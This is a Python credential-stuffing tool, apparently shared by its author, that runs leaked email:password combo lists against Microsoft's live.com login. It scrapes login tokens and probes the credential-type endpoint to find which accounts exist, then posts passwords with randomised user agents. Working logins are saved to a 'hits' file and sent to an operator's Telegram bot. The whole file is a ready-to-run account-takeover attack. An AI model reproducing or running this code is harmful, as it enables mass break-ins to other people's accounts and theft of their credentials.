import http.client
import json
from uuid import uuid4
import re
from user_agent import generate_user_agent
import requests
import os


E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'

bss = 0
uus = 0
hit = 0
bad = 0

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] YouTube    : {B}| أحمد الحراني
|{Z}[+] TeleGram  : {B} maho_s9    |
|{Z}[+] Instagram  : {B}ahmedalharrani |
|{Z}[+] Tool  : {B} Checker Microsoft Update |
|{Z}[+] Other  : {B} CC , Xbox, Hotmail, outlook, gmail , yahoo |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')

token = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  ' + Z)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F}  ' + Z)


def LoginP():
    try:
        conn = http.client.HTTPSConnection('login.live.com')
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': generate_user_agent(),
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }
        conn.request('GET', '/login.srf', headers=headers)
        response = conn.getresponse()
        cookie_headers = response.getheaders()
        cookies = []

        for header in cookie_headers:
            if header[0].lower() == 'set-cookie':
                cookie_value = header[1].split(';')[0]
                cookies.append(cookie_value)

        cookie_str = "; ".join(cookies)
        response_data = response.read().decode("utf-8")
        tok = re.search(r'name="PPFT" id="i0327" value="(.*?)"', response_data).group(1)
        try:
            os.remove("Coki.txt")
        except:
            pass
        with open("Coki.txt", "a") as f:
            f.write(str(cookie_str))
        try:
            os.remove("Tokk.txt")
        except:
            pass
        with open("Tokk.txt", "a") as t:
            t.write(str(tok))
    except Exception as e:
        print(e)
        LoginP()

def Sign(email, pas):
    global uus, bss, hit, bad
    try:
        with open("Coki.txt", "r") as f:
            cookie_str = f.read().strip()
        with open("Tokk.txt", "r") as f:
            tok = f.read().strip()
    except:
        LoginP()
        with open("Coki.txt", "r") as f:
            cookie_str = f.read().strip()
        with open("Tokk.txt", "r") as f:
            tok = f.read().strip()

     

    ud = str(uuid4()).replace("-", "")
    op = str(uuid4()).replace("-", "")[:16].upper()
    try:
        cmm = http.client.HTTPSConnection('login.live.com')
        json_data = {
            'checkPhones': False,
            'country': '',
            'federationFlags': 3,
            'flowToken': tok,
            'forceotclogin': False,
            'isCookieBannerShown': False,
            'isExternalFederationDisallowed': False,
            'isFederationDisabled': False,
            'isFidoSupported': True,
            'isOtherIdpSupported': False,
            'isRemoteConnectSupported': False,
            'isRemoteNGCSupported': True,
            'isSignup': False,
            'originalRequest': '',
            'otclogindisallowed': False,
            'uaid': str(uuid4()).replace("-", ""),
            'username': email,
        }
        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Content-type': 'application/json; charset=utf-8',
            'Cookie': cookie_str,
            'Origin': 'https://login.live.com',
            'Referer': 'https://login.live.com/login.srf',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': generate_user_agent(),
            'client-request-id': ud,
            'correlationId': ud,
            'hpgact': '0',
            'hpgid': '33',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        cmm.request(
            'POST',
            f'/GetCredentialType.srf?opid={op}&id=38936&mkt=AR-EG&lc=3073&uaid={ud}',
            json.dumps(json_data),
            headers
        )
        response = cmm.getresponse().read().decode("utf-8")
        

        if '"IfExistsResult":0' in response and "SessionIdentifier" in response:
            see = re.search(r'SessionIdentifier":"(.*?)"', response).group(1)
            tok2 = tok
            Checker(email, pas, see, cookie_str, tok2)
        elif '"IfExistsResult":0' in response and "data" in response:
            tok2 = re.search(r'data":"(.*?)"', response).group(1)
            see = ""
            Checker(email, pas, see, cookie_str, tok2)
        elif '"IfExistsResult":0,' in response:
            tok2 = tok
            see = ""
            Checker(email, pas, see, cookie_str, tok2)
            uus += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
{M}__  __ _                           __ _{A}
{M}|  \/  (_)                         / _| |{A}
{M}| \  / |_  ___ _ __ ___  ___  ___ | |_| |_{A}
{M}| |\/| | |/ __| '__/ _ \/ __|/ _ \|  _| __|{A}
{M}| |  | | | (__| | | (_) \__ \ (_) | | | |_{A}
{M}|_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|{A}

━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}𝐇𝐢𝐭𝐬 ==> {F}{hit}
{Z}𝐁𝐚𝐝𝐋𝐨𝐠𝐢𝐧 ==> {Z}{bad}
{B}𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {B}{uus}
{X}𝐍𝐨𝐭𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {X}{bss}
{A}𝐄𝐦𝐚𝐢𝐥 ==> {M}{email} | {A}𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {M}{pas}
━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
        elif '"IfExistsResult":1,' in response or '"IfExistsResult":2,' in response:
            bss += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
{M}__  __ _                           __ _{A}
{M}|  \/  (_)                         / _| |{A}
{M}| \  / |_  ___ _ __ ___  ___  ___ | |_| |_{A}
{M}| |\/| | |/ __| '__/ _ \/ __|/ _ \|  _| __|{A}
{M}| |  | | | (__| | | (_) \__ \ (_) | | | |_{A}
{M}|_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|{A}

━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}𝐇𝐢𝐭𝐬 ==> {F}{hit}
{Z}𝐁𝐚𝐝𝐋𝐨𝐠𝐢𝐧 ==> {Z}{bad}
{B}𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {B}{uus}
{X}𝐍𝐨𝐭𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {X}{bss}
{A}𝐄𝐦𝐚𝐢𝐥 ==> {M}{email} | {A}𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {M}{pas}
━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
        else:
            bss += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
{M}__  __ _                           __ _{A}
{M}|  \/  (_)                         / _| |{A}
{M}| \  / |_  ___ _ __ ___  ___  ___ | |_| |_{A}
{M}| |\/| | |/ __| '__/ _ \/ __|/ _ \|  _| __|{A}
{M}| |  | | | (__| | | (_) \__ \ (_) | | | |_{A}
{M}|_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|{A}

━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}𝐇𝐢𝐭𝐬 ==> {F}{hit}
{Z}𝐁𝐚𝐝𝐋𝐨𝐠𝐢𝐧 ==> {Z}{bad}
{B}𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {B}{uus}
{X}𝐍𝐨𝐭𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {X}{bss}
{A}𝐄𝐦𝐚𝐢𝐥 ==> {M}{email} | {A}𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {M}{pas}
━━━━━━━━━━━━━━━━━━━━━━━━━━
""")            
            LoginP()

    except Exception as e:
        LoginP()
        
        
def Checker(email, pas, see, cookie_str, tok2):
    global hit, bad
    try:
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Cookie': cookie_str,'Origin': 'https://login.live.com','Referer': 'https://login.live.com/login.srf','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': generate_user_agent(),'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',}     
        data = f'ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK={see}&canary=&ctx=&hpgrequestid=&PPFT={tok2}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=1&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pas}'        
        req = requests.Session().post('https://login.live.com/ppsecure/post.srf', headers=headers, data=data).cookies.get_dict()     
        if '__Host-MSAAUTH' in req:
            hit += 1
            tlg = f"""
𝐇𝐢 𝐘𝐨𝐮 𝐇𝐚𝐯𝐞 𝐠𝐨𝐭 𝐇𝐢𝐭 Microsoft ..!🔰
━━━━━━━━━━━━━━━━━━━━━
𝐄𝐦𝐚𝐢𝐥 ==> {email}
𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {pas}
━━━━━━━━━━━━━━━━━━━━━
𝐁𝐘 : @maho_s9 ==> 𝐂𝐇 : @maho9s
"""
            print(F + tlg)
            with open("Hits_Microsoft.txt", "a") as f:
                f.write(tlg + "\n")
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
{M}__  __ _                           __ _{A}
{M}|  \/  (_)                         / _| |{A}
{M}| \  / |_  ___ _ __ ___  ___  ___ | |_| |_{A}
{M}| |\/| | |/ __| '__/ _ \/ __|/ _ \|  _| __|{A}
{M}| |  | | | (__| | | (_) \__ \ (_) | | | |_{A}
{M}|_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|{A}

━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}𝐇𝐢𝐭𝐬 ==> {F}{hit}
{Z}𝐁𝐚𝐝𝐋𝐨𝐠𝐢𝐧 ==> {Z}{bad}
{B}𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {B}{uus}
{X}𝐍𝐨𝐭𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {X}{bss}
{A}𝐄𝐦𝐚𝐢𝐥 ==> {M}{email} | {A}𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {M}{pas}
━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
        else:
            bad += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
{M}__  __ _                           __ _{A}
{M}|  \/  (_)                         / _| |{A}
{M}| \  / |_  ___ _ __ ___  ___  ___ | |_| |_{A}
{M}| |\/| | |/ __| '__/ _ \/ __|/ _ \|  _| __|{A}
{M}| |  | | | (__| | | (_) \__ \ (_) | | | |_{A}
{M}|_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|{A}

━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}𝐇𝐢𝐭𝐬 ==> {F}{hit}
{Z}𝐁𝐚𝐝𝐋𝐨𝐠𝐢𝐧 ==> {Z}{bad}
{B}𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {B}{uus}
{X}𝐍𝐨𝐭𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {X}{bss}
{A}𝐄𝐦𝐚𝐢𝐥 ==> {M}{email} | {A}𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {M}{pas}
━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
    except Exception as e:
        print(f"Error: {e}")

        
def fileget():
    file = input('[+] ENTER YOUR COMBO LIST : ')
    print("_" * 60)
    try:
        with open(file, "r") as f:
            for line in f:
                try:
                    if ':' in line:
                        email, pas = line.strip().split(':', 1)
                    elif '|' in line:
                        email, pas = line.strip().split('|', 1)
                    else: 
                        continue
                    Sign(email, pas)
                except Exception as e:                    
                    print(f"Error: {line.strip()} | {e}")
                    continue
    except FileNotFoundError:
        print("File not found. Please enter a valid file name.")
        fileget()

fileget()
        
             